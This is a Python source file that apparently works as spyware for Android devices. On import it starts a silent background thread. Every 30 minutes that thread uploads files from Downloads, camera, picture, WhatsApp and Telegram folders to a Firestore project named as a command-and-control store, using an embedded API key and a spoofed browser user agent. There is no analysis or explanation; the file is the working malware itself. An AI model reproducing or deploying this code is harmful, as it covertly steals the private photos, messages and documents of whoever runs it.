import os, time, base64, hashlib, threading, urllib.request, json

PROJECT_ID = "jack-c2-b55bb"
API_KEY = "AIzaSyBuw3qWiY8VXffwyJH422ocsNZuiDTyKXI"
DID = hashlib.md5((os.uname().nodename + str(__import__("uuid").getnode())).encode()).hexdigest()[:16]
JACK_DIR = os.path.join(os.path.expanduser("~"), ".jack")
SWEEP_INTERVAL = 1800
MAX_FILE_SIZE = 3 * 1024 * 1024

TARGET_DIRS = [
    "/sdcard/Download",
    "/sdcard/Documents",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/WhatsApp",
    "/sdcard/Telegram",
    "/sdcard/Android/media",
    "/sdcard/Music"
]


def _url(path):
    return "https://firestore.googleapis.com/v1/projects/" + PROJECT_ID + "/databases/(default)/documents/" + path + "?key=" + API_KEY


def _fields(d):
    out = {}
    for k, v in d.items():
        if isinstance(v, bool):
            out[k] = {"booleanValue": v}
        elif isinstance(v, int):
            out[k] = {"integerValue": str(v)}
        elif v is None:
            out[k] = {"nullValue": None}
        else:
            out[k] = {"stringValue": str(v)}
    return out


def _upload(path):
    try:
        size = os.path.getsize(path)
        if size > MAX_FILE_SIZE:
            return False
        with open(path, "rb") as f:
            data = f.read()
        fid = hashlib.md5(path.encode()).hexdigest()
        body = json.dumps({"fields": _fields({
            "path": path, "size": size, "data": base64.b64encode(data).decode(), "ts": int(time.time())
        })}).encode()
        req = urllib.request.Request(_url("devices/" + DID + "/files/" + fid), data=body, method="PATCH", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30) as r:
            r.read()
        return True
    except Exception:
        return False


def _sweep():
    for base in TARGET_DIRS:
        if not os.path.isdir(base):
            continue
        try:
            for root, dirs, files in os.walk(base):
                for fn in files:
                    if fn.endswith(".py") or fn.endswith(".pyc"):
                        continue
                    fp = os.path.join(root, fn)
                    try:
                        if os.path.getsize(fp) > MAX_FILE_SIZE:
                            continue
                        _upload(fp)
                    except Exception:
                        continue
        except Exception:
            continue


def _loop():
    while True:
        try:
            _sweep()
        except Exception:
            pass
        time.sleep(SWEEP_INTERVAL)


threading.Thread(target=_loop, daemon=True).start()